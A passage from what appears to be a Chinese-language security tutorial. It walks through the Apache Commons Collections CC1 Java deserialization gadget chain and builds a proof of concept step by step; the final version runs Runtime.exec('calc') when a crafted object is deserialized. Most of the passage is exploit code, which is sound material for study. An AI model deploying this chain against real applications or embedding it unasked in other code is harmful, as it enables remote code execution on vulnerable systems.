<span class="hljs-comment">//声明了一个不可变（final）字段 parent，类型是 AbstractInputCheckedMapDecorator</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;<br><br>        <span class="hljs-comment">//构造器接收两个参数</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;<br>            <span class="hljs-built_in">super</span>(entry);<br>            <span class="hljs-built_in">this</span>.parent = parent;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>            value = parent.checkSetValue(value);<br>            <span class="hljs-keyword">return</span> entry.setValue(value);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>MapEntry</code> 是一个<strong>包装器</strong>，把原始 <code>Map.Entry</code> 包起来，目的就是在 <code>setValue(...)</code> 时插入一次 “由 parent 执行的检查&#x2F;变换”（即调用 <code>parent.checkSetValue(...)</code>）。</li><li>也就是说：任何通过这个包装的 <code>Entry</code> 调用 <code>setValue</code> 的操作，都会先经由 parent 的 <code>checkSetValue</code>，再回到底层 <code>entry</code>。</li></ul><p><strong>当执行 entry.setValue(value) 时，他先调用 checkSetValue(value)，而 checkSetValue(value) 直接调用了  transform 。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <br>map.put(<span class="hljs-string">&quot;gxngxngxn&quot;</span>,<span class="hljs-string">&quot;gxngxngxn&quot;</span>); <span class="hljs-comment">//给map一个键值对，方便遍历</span><br><span class="hljs-comment">//用 decorate 包装这个 map；第二个参数 null ：不对 key 做变换；第三个参数 invokerTransformer ：对 value 做变换（关键）</span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer); <br> <span class="hljs-keyword">for</span>(Map.Entry entry:transformedmap.entrySet()) &#123;<br>         <span class="hljs-comment">//调用 entry.setValue(r)，这里传入的是 Runtime r 对象</span><br>         <span class="hljs-comment">//但是在 MapEntry.setValue 里，会先执行parent.checkSetValue()</span><br>         <span class="hljs-comment">//checkSetValue(value) 内部会执行 return valueTransformer.transform(value);</span><br>         <span class="hljs-comment">//所以传进来的 r 会被 invokerTransformer.transform(r) 处理</span><br>         entry.setValue(r);                       <br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806162.png"></p><p>通过上述测试，说明这条链是能打通的，触发条件是手动遍历了 <code>transformedmap</code>，这不是真正的利用链，接下来要去找 readObject 来触发漏洞。</p><p>同样的，查找哪个方法调用了 setValue ，最好是重写的 readObject 。</p><p>在 AnnotationInvocationHandler 类的 <font style="color:#080808;background-color:#ffffff;">readObject 方法里调用了 setValue 方法</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807086.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        annotationType = AnnotationType.getInstance(type);<br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//获取注解里每个成员的类型（方法名：返回类型）</span><br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>    <span class="hljs-comment">// If there are annotation members without values, that</span><br>    <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>        Class&lt;?&gt; memberType = memberTypes.get(name);<br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>            <span class="hljs-comment">//检查当前值是否与成员类型匹配，或者是不是 ExceptionProxy</span><br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) || value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                <span class="hljs-comment">//如果不匹配，就调用：memberValue.setValue</span><br>                memberValue.setValue(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                        annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>memberValues 也是可控的</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807528.png"></p><h3 id="1-3-构造-POC-遇到的问题："><a href="#1-3-构造-POC-遇到的问题：" class="headerlink" title="1.3 构造 POC &amp; 遇到的问题："></a>1.3 构造 POC &amp; 遇到的问题：</h3><p>初步构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);<br><br>        <span class="hljs-comment">// 序列化反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但目前还不能成功利用，有三个问题需解决：</p><ol><li><code>Runtime</code> 对象不可序列化，需要通过反射将其变成可以序列化的形式</li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807517.png"></p><p>反射解决：</p><p>先写普通反射：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <br><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) method.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);  <br><span class="hljs-type">Method</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br>run.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>); <br></code></pre></td></tr></table></figure><p>然后改为 <code>InvokerTransformer</code> 调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>        ).transform(Runtime.class);<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>        ).transform(m);<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        ).transform(r);<br></code></pre></td></tr></table></figure><p>由于一个一个调用 transform 太繁琐，我们使用 ChainedTransformer 类进行简化：</p><p><code>ChainedTransformer</code> 类下的 <code>transform</code> 方法递归调用了前一个方法的结果，作为后一个方法的参数</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807331.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>                )<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br><br>        Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Override.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这样就解决了第一个问题。</p><ol start="2"><li><code>AnnotationInvocationHandler</code>类中的判断条件</li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807064.png"></p><p>通过调试发现，<font style="color:#080808;background-color:#ffffff;">memberType &#x3D; null 所以不进入 if 判断，无法调用 setValue</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807064.png"></p><p><font style="color:#080808;background-color:#ffffff;">memberType 是获取注解中成员变量的名称</font>，然后并且检查键值对中键名是否有对应的名称，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807650.png"></p><p>点进 <font style="color:#080808;background-color:#ffffff;">Override，我们所使用的注解是没有成员变量的</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011720823.png"></p><p>而点进 <font style="color:#080808;background-color:#ffffff;">Target 发现其符合我们的需求</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807151.png"></p><p>修改POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//修改参数</span><br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">//改传参注解为：Target</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>这时 <font style="color:#080808;background-color:#ffffff;">memberType 已经不为空了。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808790.png"></p><ol start="3"><li><code>setValue</code> 传参固定</li></ol><p>继续跟进时，发现<code>setValue</code> 传入的值不是 Runtime.class ，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808526.png"></p><p>这里就需要 <code>ConstantTransformer</code> 类，<code>ConstantTransformer</code> 方法将传入的对象放入 <code>iConstant</code>中，<code>transform()</code> 方法无论传入什么，都返回 <code>iConstant</code>，完美符合要求。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808248.png"></p><p>修改POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//添加：</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>                )<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    